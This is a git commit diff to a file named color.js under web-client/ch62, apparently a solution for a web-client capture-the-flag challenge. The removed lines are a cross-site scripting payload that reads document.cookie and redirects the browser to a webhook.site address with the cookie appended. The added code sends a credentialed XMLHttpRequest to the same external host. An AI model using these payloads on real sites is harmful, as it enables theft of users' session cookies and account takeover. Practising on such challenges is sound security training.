885edfe683e575119d77a868467d80905db878bd
NicolasGERVAIS1 <43536214+NicolasGERVAIS1@users.noreply.github.com>
2025-07-31 15:47:56 +0200

    Update color.js

--- web-client/ch62/color.js
+++ web-client/ch62/color.js
@@ -1,5 +1,21 @@
 <script> 
-  var cookie = document.cookie;
-  alert(cookie);
-  document.location="https://webhook.site/ed28b5cc-045f-4048-b049-2880871dbaad?c="+document.cookie;
+  //var cookie = document.cookie;
+  //alert(cookie);
+  //document.location="https://webhook.site/ed28b5cc-045f-4048-b049-2880871dbaad?c="+document.cookie;
+
+const xhr = new XMLHttpRequest();
+xhr.open("GET", "https://webhook.site/ed28b5cc-045f-4048-b049-2880871dbaad", true);
+xhr.withCredentials = true;
+
+xhr.onreadystatechange = function () {
+  if (xhr.readyState === XMLHttpRequest.DONE) {
+    if (xhr.status === 200) {
+      console.log("Réponse :", xhr.responseText);
+    } else {
+      console.error("Erreur HTTP :", xhr.status);
+    }
+  }
+};
+
+xhr.send();
 </script>
